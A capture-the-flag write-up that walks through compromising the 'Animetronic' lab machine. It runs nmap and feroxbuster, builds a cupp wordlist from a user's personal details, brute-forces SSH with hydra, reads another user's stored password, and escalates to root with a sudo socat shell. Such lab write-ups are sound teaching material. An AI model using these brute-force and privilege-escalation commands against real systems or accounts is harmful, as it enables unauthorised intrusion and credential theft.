---
title: "Writeup - Animetronic"
date: 2025-04-01T00:00:00+00:00
tags: ["hacking", "english","cybersec","writeups","classnotes"]
author: "XoanOuteiro"
showToc: true
TocOpen: false
draft: false
description: "A brief solution of the Animetronic CTF machine"
---

Let's start with an arpsweep to discover the targets IP address:

``` bash
sudo nmap -sn 192.168.56.100/24 -oN arpsweep.txt
```

Which results  as:

``` java
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-01 18:47 CEST
Nmap scan report for 192.168.56.1
Host is up (0.00021s latency).
MAC Address: 0A:00:27:00:00:00 (Unknown)
Nmap scan report for 192.168.56.10
Host is up (0.00020s latency).
MAC Address: 08:00:27:E9:B5:FB (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.110
Host is up (0.00042s latency).
MAC Address: 08:00:27:DE:0D:24 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.100
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 2.15 seconds
```

Target is 56.110

Lets do a portscan:

``` bash
sudo nmap -sS -p- -T4 192.168.56.110 -oN portscan.txt

Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-01 18:48 CEST
Nmap scan report for 192.168.56.110
Host is up (0.000092s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:DE:0D:24 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.90 seconds
```

And now let's do the usual -A enumeration:

``` bash
sudo nmap -sS -p 22,80 -A 192.168.56.110 -oN servicescan.txt

Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-01 18:49 CEST
Nmap scan report for 192.168.56.110
Host is up (0.00086s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 59:eb:51:67:e5:6a:9e:c1:4c:4e:c5:da:cd:ab:4c:eb (ECDSA)
|_  256 96:da:61:17:e2:23:ca:70:19:b5:3f:53:b5:5a:02:59 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Animetronic
|_http-server-header: Apache/2.4.52 (Ubuntu)
MAC Address: 08:00:27:DE:0D:24 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.86 ms 192.168.56.110

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.29 seconds
```

Thats a custom web http title. Let's take a look with ferox before walking the app:

``` bash
feroxbuster --url http://192.168.56.110 -x html -x pdf -x txt -x php -x xls
                            
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.56.110
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [html, pdf, txt, php, xls]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      279c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       52l      340w    24172c http://192.168.56.110/img/favicon.ico
200      GET       42l       81w      781c http://192.168.56.110/css/animetronic.css
301      GET        9l       28w      314c http://192.168.56.110/img => http://192.168.56.110/img/
200      GET       52l      202w     2384c http://192.168.56.110/index.html
301      GET        9l       28w      314c http://192.168.56.110/css => http://192.168.56.110/css/
301      GET        9l       28w      313c http://192.168.56.110/js => http://192.168.56.110/js/
200      GET     2761l    15370w  1300870c http://192.168.56.110/img/logo.png
200      GET        7l     1513w   144878c http://192.168.56.110/css/bootstrap.min.css
200      GET       52l      202w     2384c http://192.168.56.110/
```

When we visit the page we get a warning claiming that the service isn't working as the main factory suffered a fire.

The prompt is run again whenever we click the "Get Animetronic" button. The background image is of the FNAF Security Breach game.

Exiftool doesnt really show any useful info either on the background image or favicon.

Scanning nmap we see we could perhaps attempt bruteforcing an SSH password:

``` bash
sudo nmap -p 22 --script ssh-auth-methods 192.168.56.110

Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-01 19:03 CEST
Nmap scan report for 192.168.56.110
Host is up (0.00037s latency).

PORT   STATE SERVICE
22/tcp open  ssh
| ssh-auth-methods: 
|   Supported authentication methods: 
|     publickey
|_    password
MAC Address: 08:00:27:DE:0D:24 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 13.48 seconds
```

When fuzzing with different wordlists we find the /staffpages directory, if we fuzz under it new_employees using seclists Web-Content directory-medium-2.3.

Let's download it:

``` bash
wget http://192.168.56.110/staffpages/new_employees

--2025-04-01 19:09:57--  http://192.168.56.110/staffpages/new_employees
Connecting to 192.168.56.110:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 159577 (156K)
Saving to: ‘new_employees’

new_employees             100%[==================================>] 155.84K  --.-KB/s    in 0.001s  

2025-04-01 19:09:57 (155 MB/s) - ‘new_employees’ saved [159577/159577]
```

It's an image of FNAF animatronics. Lets check with exiftool:

``` bash
exiftool new_employees

ExifTool Version Number         : 13.00
File Name                       : new_employees
Directory                       : .
File Size                       : 160 kB
File Modification Date/Time     : 2023:11:27 18:11:43+01:00
File Access Date/Time           : 2025:04:01 19:09:57+02:00
File Inode Change Date/Time     : 2025:04:01 19:09:57+02:00
File Permissions                : -rw-rw-r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Comment                         : page for you michael : ya/HnXNzyZDGg8ed4oC+yZ9vybnigL7Jr8SxyZTJpcmQx53Xnwo=
Image Width                     : 703
Image Height                    : 1136
Encoding Process                : Progressive DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 703x1136
Megapixels                      : 0.799
```

So we know we have an user named michael and a base64 encoded page. If we translated with cyberchef, it's upside down characters saying message for michael.

``` bash
ɯǝssɐƃǝ‾ɟoɹ‾ɯıɔɥɐǝן
```

With:

``` bash
curl http://192.168.56.110
```

We get no response.

But under staffpages:

``` bash
curl http://192.168.56.110/staffpages/message_for_michael

Hi Michael

Sorry for this complicated way of sending messages between us.
This is because I assigned a powerful hacker to try to hack
our server.

By the way, try changing your password because it is easy
to discover, as it is a mixture of your personal information
contained in this file 

personal_info.txt
```

Now we know password info. Let's check the file:

``` bash
curl http://192.168.56.110/staffpages/personal_info.txt

name: Michael

age: 27

birth date: 19/10/1996

number of children: 3 " Ahmed - Yasser - Adam "

Hobbies: swimming   
```

This means that to bruteforce SSH we will need to generate a new custom dictionary for the attack:

``` bash
cupp -i

   cupp.py!                 # Common
      \                     # User
       \   ,__,             # Passwords
        \  (oo)____         # Profiler
           (__)    )\   
              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
                            [ Mebus | https://github.com/Mebus/]


[+] Insert the information about the victim to make a dictionary
[+] If you don't know all the info, just hit enter when asked! ;)

> First Name: michael
> Surname: 
> Nickname: 
> Birthdate (DDMMYYYY): 19101996


> Partners) name: 
> Partners) nickname: 
> Partners) birthdate (DDMMYYYY): 


> Child's name: Ahmed
> Child's nickname: 
> Child's birthdate (DDMMYYYY): 


> Pet's name: 
> Company name: Animetronics


> Do you want to add some key words about the victim? Y/[N]: Y
> Please enter the words, separated by comma. [i.e. hacker,juice,black], spaces will be removed: Yasser,Adam,swimming,27
> Do you want to add special chars at the end of words? Y/[N]: Y
> Do you want to add some random numbers at the end of words? Y/[N]:Y
> Leet mode? (i.e. leet = 1337) Y/[N]: Y

[+] Now making a dictionary...
[+] Sorting list and removing duplicates...
[+] Saving dictionary to michael.txt, counting 13214 words.
[+] Now load your pistolero with michael.txt and shoot! Good luck!
```

Now we can attack with hydra such as with:

``` bash
hydra -l michael -P michael.txt ssh://192.168.56.110
```

After a (considerably long) wait we get the password "leahcim1996"

So we get into SSH:

``` bash
ssh michael@192.168.56.110

The authenticity of host '192.168.56.110 (192.168.56.110)' can't be established.
ED25519 key fingerprint is SHA256:6amN4h/EjKiHufTd7GABl99uFy+fsL6YXJJRDyzxjGE.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.56.110' (ED25519) to the list of known hosts.
michael@192.168.56.110's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-89-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Mon Nov 27 21:01:13 2023 from 10.0.2.6
michael@animetronic:~$ 
michael@animetronic:~$ sudo -l
[sudo] password for michael: 
Sorry, user michael may not run sudo on animetronic.
```


We explore briefly:

``` bash
michael@animetronic:~$ cat .bash_history 
exit
michael@animetronic:~$ cd ..
michael@animetronic:/home$ ls
henry  michael
michael@animetronic:/home$ cd henry/
michael@animetronic:/home/henry$ ls
Note.txt  user.txt
michael@animetronic:/home/henry$ cat Note.txt 
if you need my account to do anything on the server,
you will find my password in file named

aGVucnlwYXNzd29yZC50eHQK
michael@animetronic:/home/henry$ cat user.txt 
[censored]
```

Lets find that file (which is henrypassword.txt in b64 btw):

``` bash
find / -name henrypassword.txt | grep henry

cat /home/henry/.new_folder/dir289/dir26/dir10/henrypassword.txt

IHateWilliam
```

So:

``` bash
michael@animetronic:/home/henry$ su henry
Password: 
henry@animetronic:~$ sudo -l
Matching Defaults entries for henry on animetronic:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User henry may run the following commands on animetronic:
    (root) NOPASSWD: /usr/bin/socat
```

We can run socat as root, so thanks to GTFObins:

``` bash
sudo socat stdin exec:/bin/sh
```

And there we are:

``` bash
henry@animetronic:~$ sudo socat stdin exec:/bin/sh
whoami
root
cat /root/root.txt
[censored]
```
